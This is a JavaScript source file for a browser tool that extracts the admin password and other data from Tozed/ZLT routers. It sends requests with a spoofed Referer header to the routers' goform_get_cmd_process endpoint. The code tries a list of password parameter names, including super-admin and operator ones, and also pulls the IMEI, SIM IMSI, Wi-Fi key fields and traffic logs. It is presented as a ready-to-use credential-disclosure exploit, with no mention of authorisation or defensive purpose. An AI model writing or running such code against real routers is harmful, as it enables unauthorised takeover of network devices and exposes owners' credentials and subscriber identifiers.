/**
 * Tozed/ZLT Router Info Extractor
 * Uses the router's built-in /goform/goform_get_cmd_process API
 * to retrieve device information including admin password, IMEI, MAC, etc.
 */

// ===== Configuration =====
const CONFIG = {
    // All known cmd parameters that Tozed/ZLT routers may support
    // The tool queries these in batches to maximize compatibility
    cmdGroups: {
        // Primary: credentials & identity
        primary: [
            'admin_Password',
            'imei',
            'mac_address',
            'wa_inner_version',
            'model_name',
            'hardware_version',
            'serial_number',
        ],
        // Network info
        network: [
            'network_type',
            'wan_ipaddr',
            'signalbar',
            'network_provider',
            'sim_imsi',
            'rssi',
            'rsrp',
            'rsrq',
            'sinr',
            'cell_id',
        ],
        // Extended device info
        extended: [
            'cr_version',
            'RD',
            'Language',
            'ssid',
            'AuthMode',
            'WPAPSK1_dbm',
            'MAX_Access_num',
            'sta_count',
            'loginfo',
            'realtime_tx_bytes',
            'realtime_rx_bytes',
            'realtime_tx_thrpt',
            'realtime_rx_thrpt',
            'monthly_rx_bytes',
            'monthly_tx_bytes',
        ],
        // Alternative parameter names (different firmware versions use different keys)
        alternatives: [
            'admin_password',
            'IMEI',
            'MAC_ADDRESS',
            'mac_addr',
            'fw_version',
            'ModelName',
            'DeviceName',
            'sn_number',
            'SN',
            'HardwareVersion',
            'hw_version',
        ],
    },
    timeout: 8000,  // Request timeout in ms
    retryDelay: 500, // Retry delay in ms
};

// ===== State =====
let routerData = {};
let passwordVisible = true;

// ===== Init =====
document.addEventListener('DOMContentLoaded', () => {
    createParticles();
    // Focus the IP input
    document.getElementById('routerIp').focus();
    // Enter key triggers extract
    document.getElementById('routerIp').addEventListener('keydown', (e) => {
        if (e.key === 'Enter') extractAll();
    });
});

// ===== Particle Background =====
function createParticles() {
    const container = document.getElementById('bgParticles');
    const count = 30;
    for (let i = 0; i < count; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.animationDuration = (8 + Math.random() * 15) + 's';
        particle.style.animationDelay = Math.random() * 10 + 's';
        particle.style.width = (2 + Math.random() * 2) + 'px';
        particle.style.height = particle.style.width;
        particle.style.opacity = 0.15 + Math.random() * 0.3;
        const hue = 230 + Math.random() * 50;
        particle.style.background = `hsl(${hue}, 70%, 65%)`;
        container.appendChild(particle);
    }
}

// ===== UI Helpers =====
function setIp(ip) {
    document.getElementById('routerIp').value = ip;
}

function showLoading(message) {
    document.getElementById('loadingText').textContent = message;
    document.getElementById('loadingOverlay').classList.add('active');
}

function hideLoading() {
    document.getElementById('loadingOverlay').classList.remove('active');
}

function setStatus(status, text) {
    const dot = document.getElementById('statusDot');
    const statusText = document.getElementById('statusText');
    dot.className = 'badge-dot';
    if (status === 'connected') {
        dot.classList.add('connected');
    } else if (status === 'connecting') {
        dot.classList.add('connecting');
    }
    statusText.textContent = text;
}

function showToast(message, isError = false) {
    const toast = document.getElementById('toast');
    const toastMsg = document.getElementById('toastMessage');
    toastMsg.textContent = message;
    toast.classList.remove('error');
    if (isError) toast.classList.add('error');
    toast.classList.add('visible');
    setTimeout(() => toast.classList.remove('visible'), 2500);
}

// ===== API Functions =====

/**
 * Make a request to the router's goform API
 * Tries both GET (with query params) and POST approaches
 */
async function queryRouter(ip, cmds) {
    const cmdString = cmds.join(',');
    const url = `http://${ip}/goform/goform_get_cmd_process`;

    // Try GET method first (most common)
    try {
        const getUrl = `${url}?isTest=false&cmd=${encodeURIComponent(cmdString)}&multi_data=1`;
        const response = await fetchWithTimeout(getUrl, {
            method: 'GET',
            headers: {
                'Referer': `http://${ip}/index.html`,
                'Accept': 'application/json, text/plain, */*',
            },
        });

        if (response.ok) {
            const text = await response.text();
            try {
                return JSON.parse(text);
            } catch {
                // Some routers return non-JSON, try to handle
                console.warn('Non-JSON response:', text);
                return null;
            }
        }
    } catch (err) {
        console.log('GET method failed, trying POST...', err.message);
    }

    // Try POST as fallback
    try {
        const formData = new URLSearchParams();
        formData.append('isTest', 'false');
        formData.append('cmd', cmdString);
        formData.append('multi_data', '1');

        const response = await fetchWithTimeout(url, {
            method: 'POST',
            headers: {
                'Referer': `http://${ip}/index.html`,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json, text/plain, */*',
            },
            body: formData.toString(),
        });

        if (response.ok) {
            const text = await response.text();
            try {
                return JSON.parse(text);
            } catch {
                console.warn('Non-JSON POST response:', text);
                return null;
            }
        }
    } catch (err) {
        console.log('POST method also failed:', err.message);
    }

    return null;
}

/**
 * Fetch with timeout support
 */
function fetchWithTimeout(url, options = {}) {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), CONFIG.timeout);
    return fetch(url, {
        ...options,
        signal: controller.signal,
    }).finally(() => clearTimeout(timeout));
}

/**
 * Try to get admin password using different parameter names and approaches
 */
async function extractPassword(ip) {
    // Method 1: Direct admin_Password query (most common)
    const passwordCmds = [
        'admin_Password', 'admin_password', 'AdminPassword',
        'password', 'Password', 'user_password',
        'super_admin_password', 'operator_password',
    ];

    // Try individual queries for password (some routers only respond to single-cmd queries)
    for (const cmd of passwordCmds) {
        try {
            const url = `http://${ip}/goform/goform_get_cmd_process?isTest=false&cmd=${cmd}&multi_data=0`;
            const response = await fetchWithTimeout(url, {
                method: 'GET',
                headers: {
                    'Referer': `http://${ip}/index.html`,
                },
            });

            if (response.ok) {
                const text = await response.text();
                try {
                    const data = JSON.parse(text);
                    const value = data[cmd];
                    if (value && value !== '' && value !== '0' && value !== 'undefined') {
                        return { key: cmd, value: value };
                    }
                } catch {}
            }
        } catch {}
    }

    return null;
}

// ===== Main Extract Function =====
async function extractAll() {
    const ip = document.getElementById('routerIp').value.trim();
    if (!ip) {
        showToast('Please enter a router IP address', true);
        return;
    }

    showLoading('Connecting to router...');
    setStatus('connecting', 'Connecting...');

    routerData = {};
    let anySuccess = false;

    try {
        // Step 1: Query primary info (including password)
        showLoading('Extracting device info...');
        const primaryData = await queryRouter(ip, CONFIG.cmdGroups.primary);
        if (primaryData) {
            routerData = { ...routerData, ...primaryData };
            anySuccess = true;
        }

        // Step 2: Try alternative parameter names
        showLoading('Trying alternative parameters...');
        const altData = await queryRouter(ip, CONFIG.cmdGroups.alternatives);
        if (altData) {
            routerData = { ...routerData, ...altData };
            anySuccess = true;
        }

        // Step 3: If we didn't get admin_Password from multi-query, try individual
        const passwordKeys = ['admin_Password', 'admin_password', 'AdminPassword', 'password'];
        let hasPassword = false;
        for (const key of passwordKeys) {
            if (routerData[key] && routerData[key] !== '') {
                hasPassword = true;
                break;
            }
        }

        if (!hasPassword) {
            showLoading('Attempting password extraction...');
            const pwResult = await extractPassword(ip);
            if (pwResult) {
                routerData[pwResult.key] = pwResult.value;
                anySuccess = true;
            }
        }

        // Step 4: Get network info
        showLoading('Fetching network details...');
        const networkData = await queryRouter(ip, CONFIG.cmdGroups.network);
        if (networkData) {
            routerData = { ...routerData, ...networkData };
            anySuccess = true;
        }

        // Step 5: Get extended info
        showLoading('Fetching extended info...');
        const extendedData = await queryRouter(ip, CONFIG.cmdGroups.extended);
        if (extendedData) {
            routerData = { ...routerData, ...extendedData };
            anySuccess = true;
        }

        hideLoading();

        if (anySuccess) {
            setStatus('connected', 'Connected');
            displayResults();
            showToast('Data extracted successfully!');
        } else {
            setStatus('disconnected', 'Failed');
            showToast('Could not connect to router. Make sure you\'re on the router\'s network.', true);
        }

    } catch (error) {
        hideLoading();
        setStatus('disconnected', 'Error');
        showToast('Connection failed: ' + error.message, true);
        console.error('Extract error:', error);
    }
}

// ===== Test Connection =====
async function testConnection() {
    const ip = document.getElementById('routerIp').value.trim();
    if (!ip) {
        showToast('Please enter a router IP address', true);
        return;
    }

    showLoading('Testing connection...');
    setStatus('connecting', 'Testing...');

    try {
        // Simple test: try to fetch just the IMEI
        const data = await queryRouter(ip, ['imei']);

        hideLoading();

        if (data && data.imei) {
            setStatus('connected', 'Connected');
            showToast(`Connected! Router IMEI: ${data.imei}`);
        } else {
            // Try alternative
            const altData = await queryRouter(ip, ['IMEI']);
            if (altData && altData.IMEI) {
                setStatus('connected', 'Connected');
                showToast(`Connected! Router IMEI: ${altData.IMEI}`);
            } else {
                setStatus('disconnected', 'No Response');
                showToast('Router reachable but no data returned. Try "Extract All".', true);
            }
        }
    } catch (error) {
        hideLoading();
        setStatus('disconnected', 'Unreachable');
        showToast('Cannot reach router at ' + ip, true);
    }
}

// ===== Display Results =====
function displayResults() {
    const section = document.getElementById('resultsSection');
    section.style.display = 'block';

    // Find the password value from various possible keys
    const passwordValue = findValue([
        'admin_Password', 'admin_password', 'AdminPassword',
        'password', 'Password', 'user_password',
        'super_admin_password', 'operator_password',
    ]);

    // Find IMEI
    const imeiValue = findValue(['imei', 'IMEI']);

    // Find MAC
    const macValue = findValue(['mac_address', 'MAC_ADDRESS', 'mac_addr']);

    // Find Model
    const modelValue = findValue(['model_name', 'ModelName', 'DeviceName']);

    // Find Firmware
    const firmwareValue = findValue(['wa_inner_version', 'fw_version', 'cr_version']);

    // Find Serial
    const serialValue = findValue(['serial_number', 'sn_number', 'SN']);

    // Find Hardware Version
    const hwValue = findValue(['hardware_version', 'HardwareVersion', 'hw_version']);

    // Find Network Type
    const networkValue = findValue(['network_type']);

    // Find WAN IP
    const wanValue = findValue(['wan_ipaddr']);

    // Update UI
    setFieldValue('adminPasswordValue', passwordValue, true);
    setFieldValue('imeiValue', imeiValue);
    setFieldValue('macValue', macValue);
    setFieldValue('modelValue', modelValue);
    setFieldValue('firmwareValue', firmwareValue);
    setFieldValue('serialValue', serialValue);
    setFieldValue('hwValue', hwValue);
    setFieldValue('networkValue', networkValue);
    setFieldValue('wanValue', wanValue);

    // Raw JSON
    const cleanData = {};
    for (const [key, value] of Object.entries(routerData)) {
        if (value !== '' && value !== undefined && value !== null) {
            cleanData[key] = value;
        }
    }
    document.getElementById('rawJson').textContent = JSON.stringify(cleanData, null, 2);

    // Animate cards
    const cards = document.querySelectorAll('.info-card');
    cards.forEach((card, i) => {
        card.style.opacity = '0';
        setTimeout(() => {
            card.classList.add('revealed');
            card.style.opacity = '';
        }, 80 * i);
    });

    // Scroll to results
    setTimeout(() => {
        section.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }, 200);
}

function findValue(keys) {
    for (const key of keys) {
        const val = routerData[key];
        if (val !== undefined && val !== null && val !== '' && val !== '0') {
            return val;
        }
    }
    return null;
}

function setFieldValue(elementId, value, isPassword = false) {
    const el = document.getElementById(elementId);
    if (value) {
        el.textContent = value;
        el.classList.remove('error');
        el.classList.add('success');
        if (isPassword) {
            el.classList.remove('masked');
            passwordVisible = true;
        }
    } else {
        el.textContent = 'Not available';
        el.classList.add('error');
        el.classList.remove('success');
    }
}

// ===== Password Visibility Toggle =====
function togglePasswordVisibility() {
    const el = document.getElementById('adminPasswordValue');
    passwordVisible = !passwordVisible;
    if (passwordVisible) {
        el.classList.remove('masked');
    } else {
        el.classList.add('masked');
    }
}

// ===== Copy Functions =====
function copyToClipboard(elementId) {
    const el = document.getElementById(elementId);
    const text = el.textContent;
    if (!text || text === '—' || text === 'Not available') {
        showToast('Nothing to copy', true);
        return;
    }

    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            showToast('Copied to clipboard!');
        }).catch(() => {
            fallbackCopy(text);
        });
    } else {
        fallbackCopy(text);
    }
}

function copyRawJson() {
    const text = document.getElementById('rawJson').textContent;
    if (!text || text === 'No data yet.') {
        showToast('Nothing to copy', true);
        return;
    }

    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            showToast('JSON copied to clipboard!');
        }).catch(() => {
            fallbackCopy(text);
        });
    } else {
        fallbackCopy(text);
    }
}

function fallbackCopy(text) {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.style.position = 'fixed';
    textarea.style.opacity = '0';
    document.body.appendChild(textarea);
    textarea.select();
    try {
        document.execCommand('copy');
        showToast('Copied to clipboard!');
    } catch {
        showToast('Copy failed. Please select manually.', true);
    }
    document.body.removeChild(textarea);
}
